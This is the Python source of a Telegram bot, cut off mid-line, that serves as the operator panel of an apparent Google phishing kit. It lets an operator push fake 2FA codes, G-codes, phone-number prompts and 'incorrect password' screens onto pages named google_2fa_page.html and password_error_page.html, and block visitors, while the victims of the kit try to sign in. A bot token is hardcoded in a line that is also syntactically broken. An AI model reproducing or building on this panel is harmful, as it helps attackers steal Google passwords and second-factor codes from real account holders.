import os
import json
import logging
import re
import random
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ===== CONFIGURATION =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8850819693:AAFoWI-u3k1t8m5x165KgkqIem85IP-rKDo)

# Get the current directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")

# Create data directory if it doesn't exist
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

DATA_FILE = os.path.join(DATA_DIR, "2fa_data.json")

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ===== DATA STORAGE =====
user_data_store = {}
blocked_users = set()
temp_codes = {}

# ===== SECURITY PREFERENCES =====
SECURITY_OPTIONS = {
    "yes_prompt": "✅ Yes Prompt",
    "sms_code_i": "📱 SMS Code I",
    "sms_code_ii": "📱 SMS Code II",
    "number_prompt": "🔢 Number Prompt",
    "password_error": "❌ Password Error",
    "block_visitor": "🚫 Block Visitor",
    "success": "✅ Success",
    "g_code": "🔑 G-Code"
}

# ===== HELPER FUNCTIONS =====
def generate_sms_code():
    return str(random.randint(100000, 999999))

def generate_g_code():
    first = str(random.randint(1000, 9999))
    second = str(random.randint(1000, 9999))
    return f"{first}-{second}"

def is_user_blocked(user_id):
    return user_id in blocked_users

def get_user_data(user_id):
    if user_id not in user_data_store:
        user_data_store[user_id] = {
            "security_preference": "yes_prompt",
            "phone_number": None,
            "sms_code": None,
            "g_code": None,
            "attempts": 0,
            "last_attempt": None,
            "verification_status": False,
            "password_error_active": False
        }
    return user_data_store[user_id]

def update_page_data(phone_number=None, code=None, g_code=None, status=None, password_error=False, email=None):
    """Update the data file for the HTML pages"""
    data = {}
    
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            try:
                data = json.load(f)
            except:
                data = {}
    
    if phone_number is not None:
        data['phone_number'] = phone_number
    if code is not None:
        data['code'] = code
    if g_code is not None:
        data['g_code'] = g_code
    if status is not None:
        data['status'] = status
    if password_error is not None:
        data['password_error'] = password_error
    if email is not None:
        data['email'] = email
    
    data['last_updated'] = datetime.now().isoformat()
    
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)
    
    logger.info(f"Page data updated: {data}")

# ===== START COMMAND =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You have been blocked from using this bot.")
        return
    
    get_user_data(user_id)
    
    welcome_text = """
🤖 *Security Bot with 2FA & G-Code Control!*

This bot controls the Google 2FA, G-code, and Password Error pages.

🔢 *Number Prompt* - Set phone number
📱 *SMS Code I* - Generate SMS code & G-Code
📱 *SMS Code II* - Generate alternative G-Code
🔑 *G-Code* - Manually set G-Code
❌ *Password Error* - Show password error notification
✅ *Success* - Verify and confirm

Select an option below:
"""
    
    keyboard = [
        [InlineKeyboardButton("🔢 Set Phone Number", callback_data="number_prompt")],
        [InlineKeyboardButton("📱 SMS Code I", callback_data="sms_code_i")],
        [InlineKeyboardButton("📱 SMS Code II", callback_data="sms_code_ii")],
        [InlineKeyboardButton("🔑 Set G-Code", callback_data="g_code_prompt")],
        [InlineKeyboardButton("❌ Password Error", callback_data="password_error")],
        [InlineKeyboardButton("✅ Verify & Success", callback_data="success")],
        [InlineKeyboardButton("🔒 Security Preference", callback_data="security_preference")],
        [InlineKeyboardButton("🚫 Block Visitor", callback_data="block_visitor")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    await update.message.reply_text(
        "🌐 *Open Pages:*\n\n"
        "1. `google_2fa_page.html` - 2FA Notification Page\n"
        "2. `password_error_page.html` - Password Error Page\n\n"
        "They will automatically update when you trigger actions from the bot.",
        parse_mode='Markdown'
    )

# ===== CALLBACK QUERY HANDLER =====
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await query.edit_message_text("🚫 You have been blocked from using this bot.")
        return
    
    data = query.data
    user_data = get_user_data(user_id)
    
    # ===== SECURITY PREFERENCE =====
    if data == "security_preference":
        text = """
🔒 *Security Preference*

Choose your preferred security method:

*Current Preference:* {}
        """.format(SECURITY_OPTIONS.get(user_data["security_preference"], "Not Set"))
        
        keyboard = [
            [InlineKeyboardButton("✅ Yes Prompt", callback_data="set_yes_prompt")],
            [InlineKeyboardButton("📱 SMS Code I", callback_data="set_sms_code_i")],
            [InlineKeyboardButton("📱 SMS Code II", callback_data="set_sms_code_ii")],
            [InlineKeyboardButton("🔢 Number Prompt", callback_data="set_number_prompt")],
            [InlineKeyboardButton("🔑 G-Code", callback_data="set_g_code")],
            [InlineKeyboardButton("❌ Password Error", callback_data="set_password_error")],
            [InlineKeyboardButton("🚫 Block Visitor", callback_data="set_block_visitor")],
            [InlineKeyboardButton("✅ Success", callback_data="set_success")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== SET SECURITY PREFERENCE =====
    elif data.startswith("set_"):
        preference = data.replace("set_", "")
        user_data["security_preference"] = preference
        
        pref_names = {
            "yes_prompt": "✅ Yes Prompt",
            "sms_code_i": "📱 SMS Code I",
            "sms_code_ii": "📱 SMS Code II",
            "number_prompt": "🔢 Number Prompt",
            "g_code": "🔑 G-Code",
            "password_error": "❌ Password Error",
            "block_visitor": "🚫 Block Visitor",
            "success": "✅ Success"
        }
        
        await query.edit_message_text(
            f"✅ Security preference set to: *{pref_names.get(preference, preference)}*\n\nReturning to menu...",
            parse_mode='Markdown'
        )
        
        import asyncio
        await asyncio.sleep(1)
        await start(update, context)
    
    # ===== SMS CODE I =====
    elif data == "sms_code_i":
        sms_code = generate_sms_code()
        g_code = generate_g_code()
        temp_codes[user_id] = sms_code
        user_data["sms_code"] = sms_code
        user_data["g_code"] = g_code
        
        update_page_data(code=sms_code, g_code=g_code, status="code_generated", password_error=False)
        
        text = f"""
📱 *SMS Code I*

A verification code has been generated.

*SMS Code:* `{sms_code}`
*G-Code:* `{g_code}`
*Valid for:* 5 minutes

✅ The G-Code on the Google sign-up page has been updated to: `{g_code}`
        """
        
        keyboard = [
            [InlineKeyboardButton("📱 Resend Code", callback_data="resend_sms_i")],
            [InlineKeyboardButton("✅ Verify", callback_data="success")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== SMS CODE II =====
    elif data == "sms_code_ii":
        sms_code = generate_sms_code()
        g_code = generate_g_code()
        temp_codes[user_id] = sms_code
        user_data["sms_code"] = sms_code
        user_data["g_code"] = g_code
        
        update_page_data(code=sms_code, g_code=g_code, status="code_generated", password_error=False)
        
        text = f"""
📱 *SMS Code II* (Alternative)

A secondary verification code has been generated.

*SMS Code:* `{sms_code}`
*G-Code:* `{g_code}`
*Valid for:* 5 minutes

✅ The G-Code has been updated to: `{g_code}`
        """
        
        keyboard = [
            [InlineKeyboardButton("📱 Resend Code", callback_data="resend_sms_ii")],
            [InlineKeyboardButton("✅ Verify", callback_data="success")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== G-CODE PROMPT =====
    elif data == "g_code_prompt":
        text = f"""
🔑 *Set G-Code*

Enter a custom G-Code for the Google sign-up page.

*Current G-Code:* {user_data.get("g_code", "Not Set")}

Format: 1234-5678 (8 digits with hyphen)

Type your G-Code in the chat.
        """
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        context.user_data['awaiting_g_code'] = True
    
    # ===== NUMBER PROMPT =====
    elif data == "number_prompt":
        text = f"""
🔢 *Number Prompt*

Please enter your phone number to update the 2FA page.

*Current Number:* {user_data["phone_number"] or "Not Set"}

Example format: +1 555 123 4567

Type your phone number in the chat.
        """
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        context.user_data['awaiting_phone_number'] = True
    
    # ===== PASSWORD ERROR =====
    elif data == "password_error":
        user_data["attempts"] += 1
        user_data["last_attempt"] = datetime.now()
        user_data["password_error_active"] = True
        
        email = user_data.get("email", "user@example.com")
        
        update_page_data(
            status="password_error",
            password_error=True,
            email=email
        )
        
        attempts = user_data["attempts"]
        error_message = f"❌ *Password Error*\n\nInvalid password. Please try again.\n\n*Attempts:* {attempts}/5"
        
        if attempts >= 5:
            error_message += "\n\n⚠️ *Maximum attempts exceeded!*\nYour account has been temporarily locked."
            user_data["locked_until"] = datetime.now() + timedelta(minutes=5)
        
        text = f"""
{error_message}

📧 *Email:* {email}
🔄 *Attempts:* {attempts}/5

🌐 Check the Password Error page to see the notification!
        """
        
        keyboard = [
            [InlineKeyboardButton("🔄 Try Again", callback_data="password_error")],
            [InlineKeyboardButton("✅ Reset Attempts", callback_data="reset_attempts")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== RESET ATTEMPTS =====
    elif data == "reset_attempts":
        user_data["attempts"] = 0
        user_data["password_error_active"] = False
        update_page_data(status="idle", password_error=False)
        
        await query.edit_message_text(
            "✅ *Attempts Reset*\n\nPassword error state has been cleared.",
            parse_mode='Markdown'
        )
        
        import asyncio
        await asyncio.sleep(1)
        await start(update, context)
    
    # ===== BLOCK VISITOR =====
    elif data == "block_visitor":
        text = """
🚫 *Block Visitor*

Block or unblock users from accessing the bot.

*Blocked Users:* {}
        """.format(len(blocked_users))
        
        keyboard = [
            [InlineKeyboardButton("🚫 Block User", callback_data="block_user")],
            [InlineKeyboardButton("✅ Unblock User", callback_data="unblock_user")],
            [InlineKeyboardButton("📋 List Blocked Users", callback_data="list_blocked")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== BLOCK USER =====
    elif data == "block_user":
        await query.edit_message_text(
            "🚫 *Block User*\n\nPlease enter the user ID of the person you want to block.\n\n*Format:* /block USER_ID",
            parse_mode='Markdown'
        )
        context.user_data['awaiting_block'] = True
    
    # ===== UNBLOCK USER =====
    elif data == "unblock_user":
        if blocked_users:
            text = "✅ *Unblock User*\n\nSelect a user to unblock:"
            keyboard = []
            
            for user_id in list(blocked_users)[:10]:
                keyboard.append([InlineKeyboardButton(f"Unblock {user_id}", callback_data=f"unblock_{user_id}")])
            
            keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="block_visitor")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        else:
            await query.edit_message_text(
                "✅ *No users are currently blocked.*",
                parse_mode='Markdown'
            )
    
    # ===== LIST BLOCKED USERS =====
    elif data == "list_blocked":
        if blocked_users:
            text = "📋 *Blocked Users*\n\n"
            for i, user_id in enumerate(list(blocked_users), 1):
                text += f"{i}. User ID: `{user_id}`\n"
            text += f"\n*Total Blocked:* {len(blocked_users)}"
        else:
            text = "✅ *No users are currently blocked.*"
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back", callback_data="block_visitor")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== UNBLOCK SPECIFIC USER =====
    elif data.startswith("unblock_"):
        user_to_unblock = int(data.replace("unblock_", ""))
        if user_to_unblock in blocked_users:
            blocked_users.remove(user_to_unblock)
            await query.edit_message_text(
                f"✅ User `{user_to_unblock}` has been unblocked.",
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text(
                f"❌ User `{user_to_unblock}` is not in the blocked list.",
                parse_mode='Markdown'
            )
        
        import asyncio
        await asyncio.sleep(1.5)
        
        text = """
🚫 *Block Visitor*

Block or unblock users from accessing the bot.

*Blocked Users:* {}
        """.format(len(blocked_users))
        
        keyboard = [
            [InlineKeyboardButton("🚫 Block User", callback_data="block_user")],
            [InlineKeyboardButton("✅ Unblock User", callback_data="unblock_user")],
            [InlineKeyboardButton("📋 List Blocked Users", callback_data="list_blocked")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== SUCCESS =====
    elif data == "success":
        user_data["attempts"] = 0
        user_data["verification_status"] = True
        user_data["password_error_active"] = False
        
        update_page_data(status="success", password_error=False)
        
        text = """
✅ *Success!*

Access granted. Welcome!

*Phone Number:* {}
*G-Code:* {}
*Security Preference:* {}
        """.format(
            user_data["phone_number"] or "Not Set",
            user_data.get("g_code", "Not Set"),
            SECURITY_OPTIONS.get(user_data["security_preference"], "Not Set")
        )
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== RESEND SMS CODE =====
    elif data.startswith("resend_sms_"):
        sms_code = generate_sms_code()
        g_code = generate_g_code()
        temp_codes[user_id] = sms_code
        user_data["sms_code"] = sms_code
        user_data["g_code"] = g_code
        
        update_page_data(code=sms_code, g_code=g_code, status="code_generated", password_error=False)
        
        code_type = "I" if data == "resend_sms_i" else "II"
        text = f"""
📱 *SMS Code {code_type}*

New verification code sent!

*SMS Code:* `{sms_code}`
*G-Code:* `{g_code}`
*Valid for:* 5 minutes

✅ The G-Code has been updated to: `{g_code}`
        """
        
        keyboard = [
            [InlineKeyboardButton("📱 Resend Code", callback_data=data)],
            [InlineKeyboardButton("✅ Verify", callback_data="success")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # ===== BACK TO MAIN MENU =====
    elif data == "back_to_menu":
        await start(update, context)
    
    # ===== HELP =====
    elif data == "help":
        help_text = """
ℹ️ *Help & Information*

*How this works:*

1. 🔢 *Set Phone Number* - Enter your phone number
   • Updates the 2FA page with your number

2. 📱 *SMS Code I/II* - Generates SMS code & G-Code
   • Updates the G-Code on the Google sign-up page

3. 🔑 *Set G-Code* - Manually enter any G-Code

4. ❌ *Password Error* - Shows the password error page
   • Displays "Incorrect Password" notification
   • Tracks failed attempts
   • Auto-locks after 5 attempts

5. ✅ *Success* - Confirms verification
   • Shows success on all pages

*Pages:*
- `google_2fa_page.html` - 2FA Notification
- `password_error_page.html` - Password Error Page
        """
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')

# ===== MESSAGE HANDLER =====
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message
    text = message.text
    
    if is_user_blocked(user_id):
        await message.reply_text("🚫
